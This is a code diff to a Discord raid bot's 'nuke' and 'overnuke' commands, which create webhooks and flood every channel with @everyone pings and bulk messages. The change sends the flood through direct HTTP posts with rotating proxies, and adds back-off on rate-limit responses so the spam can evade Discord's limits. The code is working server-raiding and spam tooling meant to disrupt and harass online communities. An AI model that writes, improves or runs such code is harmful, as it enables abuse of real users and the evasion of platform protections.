@@ -1171,13 +1171,22 @@ async def nuke(ctx, server: str = None):
         async def spam_channel(channel, lines):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
-                await webhook.send(content="@everyone")
-                for line in lines:
-                    try:
-                        await webhook.send(content=line)
-                    except:
-                        pass
-                    await asyncio.sleep(0.05)
+                webhook_url = webhook.url
+                async with aiohttp.ClientSession() as session:
+                    await session.post(webhook_url, json={"content": "@everyone"})
+                    for line in lines:
+                        proxy_url = get_random_proxy() if proxy_list else None
+                        try:
+                            kwargs = {"json": {"content": line}}
+                            if proxy_url:
+                                kwargs["proxy"] = proxy_url
+                            async with session.post(webhook_url, **kwargs) as resp:
+                                if resp.status == 429:
+                                    rotate_delay = random.uniform(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
+                                    await asyncio.sleep(rotate_delay)
+                        except:
+                            pass
+                        await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Lỗi {channel.name}: {e}")
         tasks = []
@@ -1215,13 +1224,22 @@ async def overnuke(ctx, server: str = None):
         async def spam_channel(channel, lines):
             try:
                 webhook = await channel.create_webhook(name="vvnk")
-                await webhook.send(content="@everyone")
-                for line in lines:
-                    try:
-                        await webhook.send(content=line)
-                    except:
-                        pass
-                    await asyncio.sleep(0.05)
+                webhook_url = webhook.url
+                async with aiohttp.ClientSession() as session:
+                    await session.post(webhook_url, json={"content": "@everyone"})
+                    for line in lines:
+                        proxy_url = get_random_proxy() if proxy_list else None
+                        try:
+                            kwargs = {"json": {"content": line}}
+                            if proxy_url:
+                                kwargs["proxy"] = proxy_url
+                            async with session.post(webhook_url, **kwargs) as resp:
+                                if resp.status == 429:
+                                    rotate_delay = random.uniform(PROXY_ROTATE_MIN, PROXY_ROTATE_MAX)
+                                    await asyncio.sleep(rotate_delay)
+                        except:
+                            pass
+                        await asyncio.sleep(0.05)
             except Exception as e:
                 print(f"Lỗi {channel.name}: {e}")
         tasks = []
